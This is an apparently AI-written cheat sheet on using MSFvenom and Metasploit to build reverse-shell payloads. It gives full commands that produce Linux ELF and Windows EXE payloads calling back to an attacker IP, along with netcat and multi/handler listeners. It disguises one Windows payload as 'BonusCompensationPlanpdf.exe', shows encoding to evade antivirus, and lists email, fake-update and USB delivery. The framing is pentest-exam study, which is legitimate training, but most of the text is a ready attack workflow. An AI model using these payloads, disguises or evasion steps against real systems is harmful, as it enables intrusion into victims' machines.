# 1️⃣ What is MSFvenom?

MSFvenom is a payload generation tool included in the Metasploit Framework used to:

- Create custom payloads
    
- Generate reverse shells
    
- Generate bind shells
    
- Encode payloads
    
- Bypass antivirus detection
    
- Deliver payloads via files (.exe, .elf, .php, etc.)
    

---

## 📊 MSFvenom Payload Generation Workflow

![Image](https://www.spiedigitallibrary.org/ContentImages/Proceedings/13081/130810X/FigureImages/00068_PSISDG13081_130810X_page_4_1.jpg)

![Image](https://cdn.prod.website-files.com/6961173a0b3c0ce2c689dcce/6961173a0b3c0ce2c689ec40_66427730dcfc87b6cedbcb8c_9ddeceda.jpeg)

![Image](https://cdn.prod.website-files.com/681e366f54a6e3ce87159ca4/6877c6d94cd1d4bca7c48143_bind-shell-vs-reverse-shell-01.png)

![Image](https://www.mdpi.com/applsci/applsci-13-07161/article_deploy/html/images/applsci-13-07161-g001.png)

---

# 2️⃣ Why Use MSFvenom?

Metasploit exploit modules require direct network access.

But sometimes:

- No direct network access
    
- Target behind firewall
    
- Target outside network
    
- Need social engineering
    

MSFvenom solves this by creating payload files that can be delivered via:

|Delivery Method|Example|
|---|---|
|Email attachment|malicious.exe|
|Website download|fake update|
|USB drive|payload file|
|File upload vulnerability|web upload|
|Social engineering|disguised file|

---

# 3️⃣ List Available Payloads

Command:

```bash
msfvenom -l payloads
```

Example output:

```bash
linux/x86/shell/reverse_tcp
windows/shell_reverse_tcp
multi/meterpreter/reverse_https
```

---

# 4️⃣ Payload Naming Convention

Payload names follow this structure:

```text
OS / Architecture / Payload Type / Connection Type
```

Example:

```bash
linux/x64/shell_reverse_tcp
```

Breakdown:

|Component|Meaning|
|---|---|
|linux|Target OS|
|x64|Architecture|
|shell|Payload type|
|reverse_tcp|Connection type|

---

# 5️⃣ Staged vs Stageless Payloads

## Staged Payload

Example:

```bash
linux/x86/shell/reverse_tcp
```

|Feature|Description|
|---|---|
|Multi-stage|Yes|
|Smaller initial size|Yes|
|Downloads additional code|Yes|
|Requires stable connection|Yes|
|Less stable|Sometimes|

Execution Flow:

```text
Stage 1 → Connect to attacker → Download stage 2 → Execute shell
```

---

## Stageless Payload

Example:

```bash
linux/x64/shell_reverse_tcp
```

|Feature|Description|
|---|---|
|Multi-stage|No|
|Complete payload|Yes|
|Faster execution|Yes|
|More stable|Yes|
|Less network traffic|Yes|

Execution Flow:

```text
Execute payload → Connect to attacker → Shell
```

---

## 📊 Staged vs Stageless Diagram

![Image](https://www.scaler.com/topics/images/staged-vs-non-staged-payloads2.webp)

![Image](https://www.rapid7.com/cdn/assets/blt8f189d4be4eacab7/683de21773c8453da0e8c3c2/Screen_Shot_2015-03-25_at_5.51.44_pm.png)

![Image](https://www.rapid7.com/cdn/assets/bltc17b148fbf00fca0/683de25f8ac17c3c1729ae89/Screen_Shot_2015-03-25_at_4.10.09_pm.png)

![Image](https://www.cobaltstrike.com/app/uploads/2023/01/payloadstage-light.png)

---

# 6️⃣ Creating Linux Payload with MSFvenom

Command:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```

Output:

```bash
Payload size: 74 bytes
Final size of elf file: 194 bytes
```

---

# 7️⃣ MSFvenom Command Breakdown

|Component|Meaning|
|---|---|
|msfvenom|Payload generation tool|
|-p|Payload|
|linux/x64/shell_reverse_tcp|Payload type|
|LHOST|Attacker IP|
|LPORT|Attacker port|
|-f elf|File format|
|> createbackup.elf|Output file|

---

# 8️⃣ Payload File Formats

|Format|OS|
|---|---|
|elf|Linux|
|exe|Windows|
|php|Web|
|asp|Windows web|
|ps1|PowerShell|

---

# 9️⃣ Executing Linux Payload

On attacker machine:

```bash
sudo nc -lvnp 443
```

On target machine:

```bash
./createbackup.elf
```

Result:

```bash
Connection received
```

Shell gained.

---

## 📊 Linux Reverse Shell Execution

![Image](https://cdn.prod.website-files.com/681e366f54a6e3ce87159ca4/6877c6d94cd1d4bca7c48143_bind-shell-vs-reverse-shell-01.png)

![Image](https://upload.wikimedia.org/wikipedia/commons/7/77/Elf-layout--en.svg)

![Image](https://www.offsec.com/_astro/Screen-Shot-2016-04-05-at-12.17.19-PM_Z1rl62C.webp)

---

# 🔟 Creating Windows Payload

Command:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```

Output:

```bash
Final size of exe file: 73802 bytes
```

---

# 1️⃣1️⃣ Windows Payload Breakdown

|Component|Meaning|
|---|---|
|windows|Target OS|
|shell_reverse_tcp|Reverse shell|
|-f exe|Windows executable|
|BonusCompensationPlanpdf.exe|Payload file name|

---

# 1️⃣2️⃣ Executing Windows Payload

Listener:

```bash
nc -lvnp 443
```

Victim executes file:

```text
BonusCompensationPlanpdf.exe
```

Result:

```bash
Microsoft Windows shell opened
```

---

## 📊 Windows Reverse Shell Connection

![Image](https://cdn.prod.website-files.com/681e366f54a6e3ce87159ca4/6877c6d94cd1d4bca7c48143_bind-shell-vs-reverse-shell-01.png)

![Image](https://miro.medium.com/1%2AMsEQUM0AFi2DICOmfk7mRg.png)

![Image](https://www.varonis.com/hs-fs/hubfs/Imported_Blog_Media/netcat-commands-uses.png?height=540&name=netcat-commands-uses.png&width=960)

![Image](https://cdn.prod.website-files.com/68a4552adf4a460ade53ca38/6939913bd71c24edd6133472_68d67f2bc571f5fef6aa2f73_understanding-reverse-shells.jpeg)

---

# 1️⃣3️⃣ Payload Delivery Methods

|Method|Example|
|---|---|
|Email|malicious attachment|
|Website|download link|
|USB drive|physical access|
|File upload|web shell|
|Internal network|exploit module|

---

# 1️⃣4️⃣ Encoding Payloads

Encoding helps bypass antivirus.

Example:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -e x86/shikata_ga_nai -f exe > payload.exe
```

---

# 1️⃣5️⃣ Listener Setup

Netcat listener:

```bash
nc -lvnp 443
```

Metasploit listener:

```bash
use exploit/multi/handler
```

```bash
set payload windows/meterpreter/reverse_tcp
```

```bash
exploit
```

---

# 1️⃣6️⃣ Common Payload Examples

|Payload|Description|
|---|---|
|windows/shell_reverse_tcp|Windows reverse shell|
|linux/x64/shell_reverse_tcp|Linux reverse shell|
|windows/meterpreter_reverse_tcp|Meterpreter shell|
|php/meterpreter_reverse_tcp|PHP shell|

---

# 1️⃣7️⃣ Payload Execution Flow

```text
Create payload → Deliver payload → Execute payload → Connect to attacker → Gain shell
```

---

# 1️⃣8️⃣ Key Advantages of MSFvenom

|Advantage|Description|
|---|---|
|Custom payloads|Flexible|
|Multiple formats|exe, elf, php|
|AV evasion|Encoding|
|Works with Metasploit|Easy integration|

---

# 1️⃣9️⃣ Common Mistakes

|Mistake|Problem|
|---|---|
|Wrong architecture|Payload fails|
|Wrong LHOST|No connection|
|Firewall blocking|No shell|
|AV detection|Payload deleted|

---

# 2️⃣0️⃣ Most Important Commands Cheat Sheet

|Task|Command|
|---|---|
|List payloads|msfvenom -l payloads|
|Create Linux payload|msfvenom -p linux/x64/shell_reverse_tcp -f elf|
|Create Windows payload|msfvenom -p windows/shell_reverse_tcp -f exe|
|Start listener|nc -lvnp PORT|
|Start handler|use exploit/multi/handler|

---

# 2️⃣1️⃣ Full Attack Workflow

```text
Create Payload → Deliver Payload → Victim Executes → Reverse Connection → Shell Access
```

---

If you want, I can also create a **Ultimate Reverse Shell + MSFvenom + Metasploit exam cheat sheet used for HTB, OSCP, and real pentests.